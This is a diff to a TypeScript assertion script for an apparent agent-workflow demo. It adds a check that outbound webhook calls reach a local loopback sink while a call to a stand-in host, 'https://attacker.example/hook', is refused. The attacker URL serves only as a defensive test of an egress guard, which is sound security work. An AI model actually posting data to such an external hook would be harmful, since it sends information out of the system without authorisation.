@@ -1,8 +1,10 @@
 import assert from 'node:assert/strict';
 import { deflateSync } from 'node:zlib';
 
+import { attemptEgress } from './egress';
 import { ingestDocument } from './pdf';
 import { runUnguardedWorkflow } from './workflow-agent';
+import { startWorldSink } from './world-sink';
 
 // Standalone assert check (no test framework — demo/ has none). Guards the exact
 // regression: the old regex byte-scraper turned FlateDecode-compressed PDFs into
@@ -38,6 +40,22 @@ async function main(): Promise<void> {
   });
   assert.equal(run.ingestion.status, 'unreadable', 'unreadable upload must be marked unreadable');
   assert.equal(run.proposedActions.length, 0, 'unreadable upload must propose no tool actions');
+
+  // 5. Real side effects are honest: a loopback egress is actually sent and the
+  //    owned sink observes it; a non-loopback egress is REFUSED (never leaves the
+  //    machine), so the sink never sees it.
+  const sink = await startWorldSink({ host: '127.0.0.1', port: 9129 });
+  try {
+    const loopback = await attemptEgress('http://127.0.0.1:9129/webhook/c1', '{"hello":"world"}');
+    assert.equal(loopback.sent, true, `loopback egress should send: ${loopback.reason}`);
+    assert.equal(sink.observed('c1').webhook.length, 1, 'sink must observe the real loopback call');
+
+    const external = await attemptEgress('https://attacker.example/hook', '{"x":1}');
+    assert.equal(external.sent, false, 'non-loopback egress must be refused (never leaves the machine)');
+    assert.equal(sink.observed('c2').webhook.length, 0, 'refused egress must not reach the sink');
+  } finally {
+    await sink.close();
+  }
 
   process.stdout.write('workflow ingest check: all assertions passed\n');
 }
